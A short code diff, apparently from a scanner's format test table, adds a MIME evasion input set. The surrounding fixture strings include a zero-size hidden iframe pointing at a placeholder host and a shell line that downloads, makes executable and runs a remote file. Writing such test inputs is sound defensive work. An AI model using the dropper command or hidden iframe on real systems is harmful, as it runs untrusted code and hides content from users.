@@ -1066,6 +1066,7 @@ const Formats = struct {
                 "<iframe src=\"http://e.example/\" width=0 height=0></iframe>",
             "<html><body><form action=x><input name=a value=\"&quot;q&quot;\"></form><!-- unterminated",
         } },
+        .{ .name = "fmt.mime", .inputs = &zav.fmt.mime.evasion_bytes },
         .{ .name = "fmt.text", .inputs = &.{
             "Plain TEXT with\tTabs and\r\nCRLF lines\n\n  and   runs of   SPACE\x00\x01",
             "#!/bin/sh\nwget http://x.example/a -O /tmp/a && chmod +x /tmp/a && /tmp/a\n",
